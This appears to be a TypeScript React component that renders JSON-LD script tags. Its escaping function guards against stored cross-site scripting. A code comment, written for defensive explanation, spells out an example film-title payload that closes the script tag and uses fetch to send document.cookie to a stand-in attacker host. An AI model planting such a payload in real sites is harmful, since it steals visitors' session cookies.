// Renders a JSON-LD <script> block. Server-component safe. Accepts one object
// or an array; nulls are dropped so callers can pass conditional schemas freely.

/**
 * Escape a JSON string for embedding inside <script>…</script>.
 *
 * JSON.stringify does NOT escape "<", so a value containing the literal text
 * "</script>" closes the tag early and everything after it is parsed as HTML.
 * The schemas here carry user-controlled values — a project's title, logline,
 * synopsis and author name, an opportunity's title and description — so a
 * filmmaker could name a film:
 *
 *     </script><script>fetch('https://evil.tld?c='+document.cookie)</script>
 *
 * and it would execute for every visitor to that project's public page.
 * Stored XSS, self-service, no privileges beyond a normal account.
 *
 * Escaping < and > closes it. & is escaped too so no HTML entity can be
 * reassembled, and U+2028/U+2029 because they are valid in JSON but are line
 * terminators in JavaScript, which breaks the parse. All five are \uXXXX
 * escapes, so the JSON stays byte-for-byte equivalent and every crawler reads
 * exactly the same data.
 */
function safeJsonLd(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}

type Props = { data: Record<string, unknown> | (Record<string, unknown> | null)[] };

export default function JsonLd({ data }: Props) {
  const blocks = (Array.isArray(data) ? data : [data]).filter(Boolean);
  if (blocks.length === 0) return null;
  return (
    <>
      {blocks.map((block, i) => (
        <script
          key={i}
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: safeJsonLd(block) }}
        />
      ))}
    </>
  );
}
